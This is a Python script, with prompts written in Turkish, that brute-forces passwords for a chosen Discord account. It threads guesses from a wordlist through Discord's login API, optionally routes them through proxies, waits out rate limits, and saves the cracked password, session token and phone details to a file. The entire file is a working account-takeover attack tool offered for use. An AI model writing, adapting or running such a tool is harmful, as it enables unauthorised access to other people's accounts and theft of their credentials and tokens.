import requests
import time
import threading

def login(email, password, proxies=None):
    data = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}

    if proxies:
        response = requests.post("https://discord.com/api/v9/auth/login", json=data, proxies=proxies, headers=headers)
    else:
        response = requests.post("https://discord.com/api/v9/auth/login", json=data, headers=headers)

    response_json = response.json()
    status_code = response.status_code

    if status_code == 200:
        print("Başarıyla Giriş Yapıldı.")
        token = response_json.get("token")
        user_settings = response_json.get("user_settings", {})
        verified = user_settings.get("phone_verified", False)
        phone = user_settings.get("phone")
        return {"email": email, "password": password, "status_code": status_code, "token": token, "phone_verified": verified, "phone": phone}
    else:
        error_message = response_json.get("message")
        print("Hata:", error_message)
        if response.status_code == 429:  # Rate limiting durumunda
            retry_after = int(response.headers.get("Retry-After", 5))
            print(f"Hız sınırlaması nedeniyle {retry_after} saniye bekleniyor...")
            time.sleep(retry_after)
        return None

def process_passwords(email, passwords, proxies):
    for password in passwords:
        print("Trying password:", password)
        result = login(email, password, proxies)

        if result is not None:
            with open("success.txt", "w") as f:
                f.write(str(result))
            print("Hesap bilgileri dosyaya kaydedildi: success.txt")
            print(result)
            return

        time.sleep(2)  

    print("Başarısız.")

def main():
    email = input("Mail giriniz: ")
    file_name = input("Şifre listesi girininiz: ")

    with open(file_name, "r") as f:
        passwords = f.read().splitlines()

    use_proxy = input("Proxy listesi belirtecekmisiniz? (y/n): ")

    if use_proxy == 'y':
        proxy_file = input("Proxy liste yolu giriniz: ")
        with open(proxy_file, "r") as f:
            proxies = f.read().splitlines()
    else:
        proxies = None

    num_threads = int(input("Kullanılacak thread sayısını giriniz: "))

    
    threads = []
    chunk_size = len(passwords) // num_threads
    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = (i + 1) * chunk_size if i < num_threads - 1 else len(passwords)
        thread_passwords = passwords[start_index:end_index]
        t = threading.Thread(target=process_passwords, args=(email, thread_passwords, proxies))
        threads.append(t)
        t.start()

    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
